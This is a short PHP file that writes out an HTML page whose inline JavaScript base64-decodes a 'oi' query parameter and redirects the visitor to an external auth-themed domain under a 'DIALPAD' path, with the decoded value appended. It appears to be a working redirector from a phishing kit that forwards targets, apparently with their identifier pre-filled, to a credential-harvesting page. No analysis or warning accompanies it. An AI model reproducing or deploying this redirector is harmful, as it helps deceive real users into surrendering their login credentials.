<?php
echo '<html>';
echo '<script>';
echo 'var queryParams = window.location.search';
echo '.substr(1)';
echo '.split("&")';
echo '.reduce(function (q, query) {';
echo 'var chunks = query.split("=");';
echo 'var key = chunks[0];';
echo 'var value = decodeURIComponent(chunks[1]);';
echo 'value = isNaN(Number(value)) ? value : Number(value);';
echo 'console.log("q[key] " + q[key]);';
echo 'return (q[key] = value), q;';
echo '}, {});';
echo 'window.location.replace(';
echo '"https://reply-authonline.es/DIALPAD#" +';
echo 'atob(queryParams["oi"])';
echo ');';
echo '</script>';
echo '</html>';
?>
